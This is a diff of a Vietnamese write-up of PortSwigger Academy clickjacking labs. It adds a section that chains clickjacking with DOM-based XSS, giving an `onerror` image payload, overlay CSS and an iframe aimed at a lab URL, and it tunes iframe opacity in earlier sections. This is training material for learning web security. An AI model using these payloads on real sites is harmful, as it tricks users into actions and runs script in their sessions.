@@ -46,7 +46,7 @@ Vào exploit server và cấu hình đoạn HTML sau:
   position: relative;
   width: 600px;
   height: 600px;
-  opacity: 0.9;
+  opacity: 0.00001;
   z-index: 2;
 }
 #decoy_website{
@@ -87,7 +87,7 @@ Tuy nhiên với thuộc tính `sandbox="allow-forms"`, ta có thể disable Jav
   position: relative;
   width: 600px;
   height: 600px;
-  opacity: 0.9;
+  opacity: 0.00001;
   z-index: 2;
 }
 #decoy_website{
@@ -114,6 +114,43 @@ Tuy nhiên với thuộc tính `sandbox="allow-forms"`, ta có thể disable Jav
 ```
 
 Sau khi click "Deliver to victim", kết quả thành công.
+
 # 4. Exploiting clickjacking vulnerability to trigger DOM-based XSS
+Trong chức năng submit feedback, thử submit với tham số `name=<img src=1 onerror=print()>` thì thấy lệnh print() được execute. Như vậy website có lỗ hổng XSS. Khi ta thêm các tham số name, email, subject và message vào GET request thì giá trị của các ô input được điền vào. Như vậy ta có thể exploit clickjacking.
+
+Trong exploit server, ta cấu hình đoạn HTML sau:
+```
+<style>
+#target_website{
+  position: relative;
+  width: 600px;
+  height: 1000px;
+  opacity: 0.9;
+  z-index: 2;
+}
+#decoy_website{
+  position: absolute;
+  width: 300px;
+  height: 400px;
+  z-index: 1;
+}
+#click{
+  width: 161px;
+  height: 34px;
+  position: relative;
+  top: 777px;
+  left: 18px;
+  border-radius: 30px;
+}
+</style>
+<body>
+  <div id="decoy_website">
+    <button id="click">Click me</button>
+  </div>
+  <iframe id="target_website" src="https://0ae2003d03b0871cc05cfe2200db00cb.web-security-academy.net/feedback?name=%3Cimg%20src=1%20onerror=print()%3E&email=test@gmail.com&subject=test&message=test"></iframe>
+</body>
+```
+
+Sau khi click "Deliver to victim", kết quả thành công.
 
 # 5. Multistep clickjacking
